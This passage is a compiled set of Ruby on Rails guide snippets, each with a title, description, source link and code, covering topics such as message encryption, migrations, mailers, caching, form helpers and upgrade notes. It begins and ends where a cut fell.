encrypt_and_sign method, describing the :expires_at option and its effect on message verification. Example code demonstrates encrypting and signing a message and the failure to verify it after expiration. Relies on ActiveSupport::MessageEncryptor for cryptographic operations, requires an encryptor object, and the :expires_at option as a datetime.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\n# ==== Options\n#\n# [+:expires_at+]\n#   The datetime at which the message expires. After this datetime,\n#   verification of the message will fail.\n#\n#     message = encryptor.encrypt_and_sign(\"hello\", expires_at: Time.now.tomorrow)\n#     encryptor.decrypt_and_verify(message) # => \"hello\"\n#     # 24 hours later...\n#     encryptor.decrypt_and_verify(message) # => nil\n```\n\n----------------------------------------\n\nTITLE: Backtrace Display When Catch Breakpoint is Triggered\nDESCRIPTION: Shows the result when a catch breakpoint is triggered, automatically displaying the backtrace as specified in the chained command. This provides immediate context about the exception without requiring manual commands.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nStop by #0  BP - Catch  \"ActiveRecord::RecordInvalid\"\n\n(rdbg:catch) bt 10\n=>#0    ActiveRecord::Validations#raise_validation_error at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:80\n  #1    ActiveRecord::Validations#save!(options={}) at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/validations.rb:53\n  #2    block in save! at ~/.rbenv/versions/3.0.1/lib/ruby/gems/3.0.0/gems/activerecord-7.0.0.alpha2/lib/active_record/transactions.rb:302\n```\n\n----------------------------------------\n\nTITLE: Sending Email with Body as String and Custom Content-Type (Ruby)\nDESCRIPTION: Demonstrates constructing an email in a mailer action by passing the body and content_type explicitly to the mail method, bypassing template rendering. This usage is suited for dynamically built messages or rendering pipelines, supporting overridden subject and HTML or plain text formats. If content_type is not specified, Rails defaults to text/plain.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailer_basics.md#2025-04-23_snippet_31\n\nLANGUAGE: ruby\nCODE:\n```\nclass UserMailer < ApplicationMailer\n  def welcome_email\n    mail(to: params[:user].email,\n         body: params[:email_body],\n         content_type: \"text/html\",\n         subject: \"Already rendered!\")\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Generating Migrations for Specific Databases - Rails CLI - Bash\nDESCRIPTION: This snippet demonstrates invoking the Rails generator to create a new migration targeting a named database configuration 'animals' using the --database flag. It requires Rails installed and configured for multi-database support. The command takes the migration name, column definitions, and database target; input is via shell and output is file creation in the relevant migration directory.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_10\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails generate migration CreateDogs name:string --database animals\n```\n\n----------------------------------------\n\nTITLE: Creating Documents Table and Full-Text Index - ActiveRecord Migration - Ruby\nDESCRIPTION: Defines a documents table with title and body, and adds a GIN index for full-text search using to_tsvector on both columns in English. Requires PostgreSQL with GIN and full-text search support, and ActiveRecord migration system. Inputs are column data; outputs are a table suitable for simple full-text search queries. Supports efficient text search via specialized index.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_postgresql.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20131220144913_create_documents.rb\\ncreate_table :documents do |t|\\n  t.string :title\\n  t.string :body\\nend\\n\\nadd_index :documents, \\\"to_tsvector('english', title || ' ' || body)\\\", using: :gin, name: \\\"documents_idx\\\"\n```\n\n----------------------------------------\n\nTITLE: DateTime Advance Month and Seconds Example in Ruby\nDESCRIPTION: This example illustrates the importance of order when using `advance` with DateTime objects. Advancing months then seconds gives a different result than advancing seconds then months due to the varying lengths of months. This is because the date components are advanced using `Date#advance` before adjusting the time components.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_163\n\nLANGUAGE: ruby\nCODE:\n```\nd = DateTime.new(2010, 2, 28, 23, 59, 59)\n# => Sun, 28 Feb 2010 23:59:59 +0000\nd.advance(months: 1, seconds: 1)\n# => Mon, 29 Mar 2010 00:00:00 +0000\n```\n\nLANGUAGE: ruby\nCODE:\n```\nd.advance(seconds: 1).advance(months: 1)\n# => Thu, 01 Apr 2010 00:00:00 +0000\n```\n\n----------------------------------------\n\nTITLE: Installing Action Mailbox using Rails command\nDESCRIPTION: This command installs Action Mailbox into a Rails application. It generates the `application_mailbox.rb` file and copies the required migrations for setting up Action Mailbox.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_0\n\nLANGUAGE: Bash\nCODE:\n```\n$ bin/rails action_mailbox:install\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoload Paths in Ruby on Rails\nDESCRIPTION: This code snippet shows how to configure autoload paths in a Rails application. It demonstrates adding the 'lib' directory to autoload paths and eager load paths.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nconfig.autoload_lib(ignore: %w(assets tasks))\n```\n\n----------------------------------------\n\nTITLE: Avoid Caching Instances of Active Record Objects\nDESCRIPTION: Illustrates the anti-pattern of caching Active Record object instances directly and suggests caching IDs or primitive data types instead. Caching instances can lead to stale data and issues in development and production environments.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\n# super_admins is an expensive SQL query, so don't run it too often\nRails.cache.fetch(\"super_admin_users\", expires_in: 12.hours) do\n  User.super_admins.to_a\nend\n```\n\n----------------------------------------\n\nTITLE: Default Scope with Array Arguments in Rails\nDESCRIPTION: Demonstrates how `default_scope` query arguments in `Array` format cannot be converted to a `Hash` for default attribute assignment during record creation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_167\n\nLANGUAGE: ruby\nCODE:\n```\nclass Book < ApplicationRecord\n  default_scope { where(\"out_of_print = ?\", false) }\nend\n```\n\n----------------------------------------\n\nTITLE: Removing EXIF-based Rotation in Ruby on Rails Active Storage\nDESCRIPTION: This code demonstrates how to remove EXIF-based rotation when processing image variants in Rails Active Storage, as Vips automatically handles rotation.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_23\n\nLANGUAGE: diff\nCODE:\n```\n- variant(format: :jpg, rotate: rotation_value)\n+ variant(format: :jpg)\n```\n\n----------------------------------------\n\nTITLE: Rendering JavaScript in Rails\nDESCRIPTION: This snippet shows how to render a JavaScript string in Rails. The `render` method sends the provided string to the browser with the `text/javascript` MIME type. No specific dependencies are required beyond the basic Rails environment.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nrender js: \"alert('Hello Rails');\"\n```\n\n----------------------------------------\n\nTITLE: Using Headless Chrome with Selenium (Ruby)\nDESCRIPTION: This code demonstrates how to configure Selenium to use a headless Chrome browser for system tests. The `:using` option is set to `:headless_chrome` within the `driven_by` method. Requires the selenium-webdriver gem.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_62\n\nLANGUAGE: ruby\nCODE:\n```\nrequire \"test_helper\"\n\nclass ApplicationSystemTestCase < ActionDispatch::SystemTestCase\n  driven_by :selenium, using: :headless_chrome\nend\n```\n\n----------------------------------------\n\nTITLE: Test Framework Migration in Ruby Rails\nDESCRIPTION: Shows the change in testing framework from Test::Unit::TestCase to ActiveSupport::TestCase\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_24\n\nLANGUAGE: ruby\nCODE:\n```\nTest::Unit::TestCase\n```\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::TestCase\n```\n\n----------------------------------------\n\nTITLE: Creating Table with Composite Primary Key in Rails\nDESCRIPTION: This snippet demonstrates how to create a table with a composite primary key using the 'create_table' method in a Rails migration. It defines the 'customer_id' and 'product_sku' columns as the composite primary key for the 'products' table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_53\n\nLANGUAGE: ruby\nCODE:\n```\nclass CreateProducts < ActiveRecord::Migration[8.1]\n  def change\n    create_table :products, primary_key: [:customer_id, :product_sku] do |t|\n      t.integer :customer_id\n      t.string :product_sku\n      t.text :description\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Truncate Bytes with Custom Omission\nDESCRIPTION: This snippet demonstrates truncating a string to a specified byte size using a custom omission string.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_47\n\nLANGUAGE: ruby\nCODE:\n```\n\"👍👍👍👍\".truncate_bytes(15, omission: \"🖖\")\n# => \"👍👍🖖\"\n```\n\n----------------------------------------\n\nTITLE: Association Class Name Configuration\nDESCRIPTION: Shows how to use symbols for class_name option in associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nhas_many :clients, :class_name => :Client # Note that the symbol need to be capitalized\n```\n\n----------------------------------------\n\nTITLE: Configuring Database CLI Tools\nDESCRIPTION: This snippet shows how to configure the CLI tool used for accessing the database when running `bin/rails dbconsole`. It allows specifying different tools for different database systems and provides fallback options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_42\n\nLANGUAGE: ruby\nCODE:\n```\n# config/application.rb\n\nconfig.active_record.database_cli = { postgresql: \"pgcli\", mysql: %w[ mycli mysql ] }\n```\n\n----------------------------------------\n\nTITLE: Enabling Solid Queue when Skipping Solid Cache\nDESCRIPTION: This command shows how to enable Solid Queue if Solid Cache was skipped during application creation using `--skip-solid`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/caching_with_rails.md#_snippet_23\n\nLANGUAGE: bash\nCODE:\n```\nbin/rails app:enable-solid-queue\n```\n\n----------------------------------------\n\nTITLE: Using to_partial_path in Active Model (IRB)\nDESCRIPTION: This snippet shows how to use `to_partial_path`, which returns a string representing the path associated with the object. Action Pack uses this to find a suitable partial.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_18\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.to_partial_path\n=> \"people/person\"\n```\n\n----------------------------------------\n\nTITLE: Building Empty Children in Controller in Rails\nDESCRIPTION: This Ruby code snippet shows how to build empty `Address` records in the `new` action of the `PeopleController`. This ensures that at least two sets of address fields are rendered in the new person form, even if the person has no existing addresses. The `2.times { @person.addresses.build }` line creates two new, unsaved `Address` objects associated with the `@person`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_78\n\nLANGUAGE: ruby\nCODE:\n```\ndef new\n  @person = Person.new\n  2.times { @person.addresses.build }\nend\n```\n\n----------------------------------------\n\nTITLE: Example of Bad vs. Good Rails Application Terminology\nDESCRIPTION: Shows the correct terminology for referring to Rails applications versus engines or plugins. Corrects common misuse of terms like \"service\" when referring to applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/api_documentation_guidelines.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\n# BAD\n# Production services can report their status upstream.\n# Devise is a Rails authentication application.\n\n# GOOD\n# Production applications can report their status upstream.\n# Devise is a Rails authentication engine.\n```\n\n----------------------------------------\n\nTITLE: Adding Author Association to Article Model\nDESCRIPTION: Ruby code that adds the author_name attribute accessor, author association, and set_author method to the Blorgh::Article model.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_40\n\nLANGUAGE: ruby\nCODE:\n```\nattr_accessor :author_name\nbelongs_to :author, class_name: \"User\"\n\nbefore_validation :set_author\n\nprivate\n  def set_author\n    self.author = User.find_or_create_by(name: author_name)\n  end\n```\n\n----------------------------------------\n\nTITLE: Adding Notes, Tips, and Warnings - Markdown\nDESCRIPTION: Demonstrates how to prefix documentation paragraphs with NOTE, TIP, or WARNING annotations for emphasis. This convention is processed by the guides generator to visually distinguish important sections; no dependencies are needed, although guide processors must recognize these tokens.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/ruby_on_rails_guides_guidelines.md#2025-04-23_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\nNOTE: Use `NOTE`, `TIP` or `WARNING` to highlight a paragraph.\n```\n\n----------------------------------------\n\nTITLE: Spring Dependency Error Example - Plain Text\nDESCRIPTION: Shows the error message that occurs when using an outdated version of Spring with Rails 7.0, indicating the need to upgrade Spring to at least version 3.0.0.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_17\n\nLANGUAGE: plaintext\nCODE:\n```\nundefined method `mechanism=' for ActiveSupport::Dependencies:Module\n```\n\n----------------------------------------\n\nTITLE: Disabling Transactional Tests for Parallel Transactions\nDESCRIPTION: This code demonstrates how to disable transactional tests for testing parallel database transactions in threads.  Setting `self.use_transactional_tests = false` prevents blocking issues.  Remember to cleanup any data created by these tests manually.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_115\n\nLANGUAGE: ruby\nCODE:\n```\nclass WorkerTest < ActiveSupport::TestCase\n  self.use_transactional_tests = false\n\n  test \"parallel transactions\" do\n    # start some threads that create transactions\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Event Instrumentation Without Block\nDESCRIPTION: Shows how to use instrumentation for messaging without a block execution.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_35\n\nLANGUAGE: ruby\nCODE:\n```\nActiveSupport::Notifications.instrument \"my.custom.event\", this: :data\n\nActiveSupport::Notifications.subscribe \"my.custom.event\" do |name, started, finished, unique_id, data|\n  puts data.inspect # {:this=>:data}\nend\n```\n\n----------------------------------------\n\nTITLE: SQL Equivalent of Active Record Query with Where and Order\nDESCRIPTION: Shows the generated SQL query corresponding to the preceding Ruby Active Record query (`Book.where(...).order(...)`). It selects all columns from the 'books' table, filters by 'author' using a parameterized query, and orders by 'created_at' descending.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_11\n\nLANGUAGE: sql\nCODE:\n```\nSELECT \"books\".* FROM \"books\" WHERE \"books\".\"author\" = ? ORDER BY \"books\".\"created_at\" DESC [[\"author\", \"Douglas Adams\"]]\n```\n\n----------------------------------------\n\nTITLE: Adding a Source to Gemfile using add_source\nDESCRIPTION: Demonstrates how to add a source to the generated application's `Gemfile` using the `add_source` method.  Shows both adding the source only and adding a source with a gem group.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/rails_application_templates.md#_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nadd_source \"http://gems.github.com\"\n\nadd_source \"http://gems.github.com/\" do\n  gem \"rspec-rails\"\nend\n```\n\n----------------------------------------\n\nTITLE: Running zeitwerk:check via Rails Task - Bash\nDESCRIPTION: Demonstrates the manual invocation of the Zeitwerk check rake task in a Rails application to verify that the project directory structure abides by Zeitwerk naming conventions. No Ruby-specific dependencies are required, but the Rails environment must be correctly set up. The output indicates if configuration is valid; success includes 'All is good!' in the message.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_20\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails zeitwerk:check\nHold on, I am eager loading the application.\nAll is good!\n```\n\n----------------------------------------\n\nTITLE: Adding Unsubscribe Link to HTML Email Template - ERB\nDESCRIPTION: This code snippet adds an unsubscribe link to the HTML email template.  It uses `link_to` to create a hyperlink that points to the `unsubscribe_url` with the subscriber's unique unsubscribe token. The token is generated using `params[:subscriber].generate_token_for(:unsubscribe)`.  The link allows users to easily unsubscribe from future emails.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_117\n\nLANGUAGE: erb\nCODE:\n```\n<h1>Good news!</h1>\n\n<p><%= link_to @product.name, product_url(@product) %> is back in stock.</p>\n\n<%= link_to \"Unsubscribe\", unsubscribe_url(token: params[:subscriber].generate_token_for(:unsubscribe)) %>\n```\n\n----------------------------------------\n\nTITLE: Creating Comment Display Partial (ERB)\nDESCRIPTION: Defines the content for the comment partial (`app/views/blorgh/comments/_comment.html.erb`). This partial is rendered for each comment in the collection and displays the comment's text along with a counter (`comment_counter`) provided automatically by the `render` collection helper.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_25\n\nLANGUAGE: erb\nCODE:\n```\n<%= comment_counter + 1 %>. <%= comment.text %>\n```\n\n----------------------------------------\n\nTITLE: Params Hash from fields_for with index option in Rails\nDESCRIPTION: This Ruby hash illustrates the structure of the `params` hash that is generated when submitting a form created with `fields_for` and the `:index` option.  It demonstrates how address attributes are nested under the `person` hash, with address IDs (23 and 45) used as keys to differentiate individual address records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_75\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  \"person\" => {\n    \"name\" => \"Bob\",\n    \"address\" => {\n      \"23\" => {\n        \"city\" => \"Paris\"\n      },\n      \"45\" => {\n        \"city\" => \"London\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using after_destroy_commit Callback in Rails\nDESCRIPTION: This code demonstrates the use of `after_destroy_commit` as an alias for `after_commit` with the `:on` option set to `:destroy`. This ensures that the callback is only executed after a successful database commit following a record's destruction. This provides a cleaner and more readable way to define callbacks that should only be triggered after a destroy operation is committed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_41\n\nLANGUAGE: ruby\nCODE:\n```\nclass PictureFile < ApplicationRecord\n  after_destroy_commit :delete_picture_file_from_disk\n\n  def delete_picture_file_from_disk\n    if File.exist?(filepath)\n      File.delete(filepath)\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Action Mailbox with Callbacks and Bouncing\nDESCRIPTION: This example demonstrates an Action Mailbox that processes emails, utilizing callbacks to check prerequisites and bounces emails if certain conditions are not met.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_19\n\nLANGUAGE: ruby\nCODE:\n```\n# app/mailboxes/forwards_mailbox.rb\nclass ForwardsMailbox < ApplicationMailbox\n  # Callbacks specify prerequisites to processing\n  before_processing :require_projects\n\n  def process\n    # Record the forward on the one project, or…\n    if forwarder.projects.one?\n      record_forward\n    else\n      # …involve a second Action Mailer to ask which project to forward into.\n      request_forwarding_project\n    end\n  end\n\n  private\n    def require_projects\n      if forwarder.projects.none?\n        # Use Action Mailers to bounce incoming emails back to sender – this halts processing\n        bounce_with Forwards::BounceMailer.no_projects(inbound_email, forwarder: forwarder)\n      end\n    end\n\n    def record_forward\n      forwarder.forwards.create subject: mail.subject, content: mail.decoded\n    end\n\n    def request_forwarding_project\n      Forwards::RoutingMailer.choose_project(inbound_email, forwarder: forwarder).deliver_now\n    end\n\n    def forwarder\n      @forwarder ||= User.find_by(email_address: mail.from)\n    end\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Multi-Platform Docker Images for Rails\nDESCRIPTION: Commands for building and pushing multi-platform Docker images for a Rails application, supporting both AMD64 and ARM64 architectures.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/7_1_release_notes.md#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n$ docker login -u <your-user>\n$ docker buildx create --use\n$ docker buildx build --push --platform=linux/amd64,linux/arm64 -t <your-user/image-name> .\n```\n\n----------------------------------------\n\nTITLE: Generating Grouped Options for Select Helpers - Rails (Ruby)\nDESCRIPTION: Uses grouped_options_for_select to produce grouped option tags inside a select element. Accepts an array of label/option pairs, a selected value, and an optional prompt. This helper simplifies creating grouped selects, commonly used in forms. Dependencies are Action View 2.3+; output is a string of HTML option and optgroup tags.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_3_release_notes.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\ngrouped_options_for_select([[\\\"Hats\\\", [\\\"Baseball Cap\\\",\\\"Cowboy Hat\\\"]]],\\n  \\\"Cowboy Hat\\\", \\\"Choose a product...\\\")\n```\n\n----------------------------------------\n\nTITLE: Pattern Matching and Splatting Options to Helper Methods in Rails\nDESCRIPTION: This example demonstrates how to use pattern matching with `local_assigns` to extract variables and then splat the remaining options into a helper method (e.g., `tag.div`). This allows for passing additional attributes to the rendered HTML element.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_view_overview.md#_snippet_25\n\nLANGUAGE: html+erb\nCODE:\n```\n<%# app/views/products/_product.html.erb %>\n\n<% local_assigns => { product:, **options } %>\n\n<%= tag.div id: dom_id(product), **options do %>\n  <h1><%= product.name %></h1>\n<% end %>\n\n<%# app/views/products/show.html.erb %>\n\n<%= render \"products/product\", product: @product, class: \"card\" %>\n<%# => <div id=\"product_1\" class=\"card\">\n  #      <h1>A widget</h1>\n  #    </div>\n%>\n```\n\n----------------------------------------\n\nTITLE: Filtering Records with where in Rails\nDESCRIPTION: This snippet demonstrates how to filter records based on a specific column using the `where` method in ActiveRecord. It generates a SQL `SELECT` query with a `WHERE` clause to retrieve records where the `name` attribute matches 'Pants'. It returns an `ActiveRecord::Relation` object.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_23\n\nLANGUAGE: irb\nCODE:\n```\nstore(dev)> Product.where(name: \"Pants\")\n  Product Load (1.5ms)  SELECT \"products\".* FROM \"products\" WHERE \"products\".\"name\" = 'Pants' /* loading for pp */ LIMIT 11 /*application='Store'*/\n=> [#<Product:0x000000012184d858 id: 2, name: \"Pants\", created_at: \"2024-11-09 16:36:01.856751000 +0000\", updated_at: \"2024-11-09 16:36:01.856751000 +0000\">]\n```\n\n----------------------------------------\n\nTITLE: Enforcing Read-Only Replica Access - ActiveRecord - Ruby\nDESCRIPTION: This snippet extends the manual connection switching method by passing 'prevent_writes: true' to ensure only read queries are permitted within the block. It adds an extra layer of protection against accidental writes. The block is executed in the context of the replica and raises an error if a write query is attempted.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\nActiveRecord::Base.connected_to(role: :reading, prevent_writes: true) do\n  # Rails will check each query to ensure it's a read query.\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering a Greeting in ERB (Ruby on Rails, ERB)\nDESCRIPTION: This snippet is an ERB (Embedded Ruby) template for the 'hello' view of the 'Greetings' controller. It renders a title as an h1 element and a paragraph with the contents of the '@message' variable set by the controller. Dependencies: Rails view rendering system. Inputs: instance variable '@message'. Output: HTML page displaying the greeting. Intended to be placed at 'app/views/greetings/hello.html.erb'.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_9\n\nLANGUAGE: erb\nCODE:\n```\n<h1>A Greeting for You!</h1>\\n<p><%= @message %></p>\n```\n\n----------------------------------------\n\nTITLE: Running the Full Rails Test Suite\nDESCRIPTION: This bash command executes the entire Rails test suite. The output displays the test results, indicating the number of runs, assertions, failures, errors, and skips.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_127\n\nLANGUAGE: bash\nCODE:\n```\n$ bin/rails test\n```\n\n----------------------------------------\n\nTITLE: Specifying Layout in Rails Rendering\nDESCRIPTION: This snippet demonstrates how to specify a layout for rendering in Rails. The `:layout` option allows you to use a specific layout file or disable layouts altogether.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_20\n\nLANGUAGE: ruby\nCODE:\n```\nrender layout: \"special_layout\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nrender layout: false\n```\n\n----------------------------------------\n\nTITLE: Using SGID from API in Attachment Tag\nDESCRIPTION: This snippet shows how to insert the `attachable_sgid` obtained from the API into the rich text content using the `<action-text-attachment>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_text_overview.md#_snippet_19\n\nLANGUAGE: html\nCODE:\n```\n<action-text-attachment sgid=\"BAh7CEkiCG…\"></action-text-attachment>\n```\n\n----------------------------------------\n\nTITLE: Converting Numbers to Bytes in Ruby\nDESCRIPTION: This demonstrates the use of `bytes`, `kilobytes`, `megabytes`, `gigabytes`, `terabytes`, `petabytes`, `exabytes`, and `zettabytes` methods to get the corresponding byte value for a number. These are ActiveSupport core extensions to the Numeric class.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_95\n\nLANGUAGE: ruby\nCODE:\n```\n2.kilobytes   # => 2048\n3.megabytes   # => 3145728\n3.5.gigabytes # => 3758096384.0\n-4.exabytes   # => -4611686018427387904\n```\n\n----------------------------------------\n\nTITLE: New Active Record Dynamic Finders\nDESCRIPTION: Examples of new dynamic finder methods in Active Record including find_last_by_attribute and find_by_attribute! with error handling.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# Get the last user who signed up from London\nUser.find_last_by_city('London')\n\n# Raise ActiveRecord::RecordNotFound exception if 'Moby' hasn't signed up yet!\nUser.find_by_name!('Moby')\n```\n\n----------------------------------------\n\nTITLE: Rendering with Inline ERB\nDESCRIPTION: Demonstrates rendering content directly within the controller using inline ERB. It iterates through a collection of products and displays their names.  Discouraged due to violating MVC principles.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_9\n\nLANGUAGE: ruby\nCODE:\n```\nrender inline: \"<% products.each do |p| %><p><%= p.name %></p><% end %>\"\n```\n\n----------------------------------------\n\nTITLE: Updating Gemfile for Rails 3.1 Upgrade\nDESCRIPTION: Essential Gemfile configuration for upgrading to Rails 3.1.3, including the required gems for the new asset pipeline and jQuery as the default JavaScript library.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\ngem \"rails\", \"= 3.1.3\"\ngem \"mysql2\"\n\n# Needed for the new asset pipeline\ngroup :assets do\n  gem \"sass-rails\",   \"~> 3.1.5\"\n  gem \"coffee-rails\", \"~> 3.1.1\"\n  gem \"uglifier\",     \">= 1.0.3\"\nend\n\n# jQuery is the default JavaScript library in Rails 3.1\ngem \"jquery-rails\"\n```\n\n----------------------------------------\n\nTITLE: Rails Notes Configuration\nDESCRIPTION: Ruby configuration for customizing Rails notes behavior.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/command_line.md#2025-04-23_snippet_17\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.annotations.register_tags(\"DEPRECATEME\", \"TESTME\")\n```\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.annotations.register_directories(\"spec\", \"vendor\")\n```\n\nLANGUAGE: ruby\nCODE:\n```\nconfig.annotations.register_extensions(\"scss\", \"sass\") { |annotation| /\\/\\/\\s*(#{annotation}):?\\s*(.*)$/ }\n```\n\n----------------------------------------\n\nTITLE: Setting up Dev Container with Podman for Rails development\nDESCRIPTION: Commands to initialize, start a Podman machine, and set up a development container for Rails using Podman instead of Docker.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\n$ podman machine init\n$ podman machine start\n$ tools/devcontainer up\n```\n\n----------------------------------------\n\nTITLE: Pulling changes from a contributor's remote branch\nDESCRIPTION: Commands to add a remote repository and pull changes from a contributor's topic branch for review and testing.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$ git remote add JohnSmith https://github.com/JohnSmith/rails.git\n$ git pull JohnSmith orange\n```\n\n----------------------------------------\n\nTITLE: Lazy Translation Lookup in Views\nDESCRIPTION: Demonstrates Rails' convenient way to look up translations in views using dot notation\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_35\n\nLANGUAGE: yaml\nCODE:\n```\nes:\n  books:\n    index:\n      title: \"Título\"\n```\n\nLANGUAGE: erb\nCODE:\n```\n<%= t '.title' %>\n```\n\n----------------------------------------\n\nTITLE: Storing Mandrill API Key in Credentials\nDESCRIPTION: This YAML code shows how to store the Mandrill API key in the Rails encrypted credentials file. This is read by Action Mailbox.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_mailbox_basics.md#_snippet_12\n\nLANGUAGE: YAML\nCODE:\n```\naction_mailbox:\n  mandrill_api_key: ...\n```\n\n----------------------------------------\n\nTITLE: Allow Unauthenticated Access - Ruby\nDESCRIPTION: This Ruby snippet demonstrates allowing unauthenticated access to specific controller actions (index and show) using the `allow_unauthenticated_access` method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_72\n\nLANGUAGE: ruby\nCODE:\n```\nclass ProductsController < ApplicationController\n  allow_unauthenticated_access only: %i[ index show ]\n  # ...\nend\n```\n\n----------------------------------------\n\nTITLE: Adding rails-deprecated_sanitizer gem for legacy HTML sanitization\nDESCRIPTION: Gemfile entry to include the deprecated HTML sanitizer implementation for applications that need to continue using the old sanitizer instead of the new Rails HTML Sanitizer.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_69\n\nLANGUAGE: ruby\nCODE:\n```\ngem 